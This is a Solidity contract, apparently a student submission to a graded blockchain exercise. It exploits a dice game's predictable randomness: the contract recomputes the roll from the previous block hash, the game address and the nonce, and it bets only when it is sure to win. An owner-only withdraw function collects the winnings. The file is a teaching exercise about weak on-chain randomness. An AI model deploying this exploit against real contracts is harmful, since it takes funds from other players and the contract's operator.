pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;
	event RiggedRolled();

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address addy, uint256 amount) external onlyOwner {
		require(address(this).balance > 0, "not funds to send");
		(bool sent, ) = payable(addy).call{ value: amount }("");
		require(sent, "payment failed");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

	function riggedRoll() public {
		if (address(this).balance < 0.002 ether) {
			revert("Not enough balance");
		}

		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encode(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;

		uint valueToSend = .002 ether;

		if (roll <= 5) {
			diceGame.rollTheDice{ value: valueToSend }();
		} else {
			revert("Wrong roll");
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.

	receive() external payable {}
}
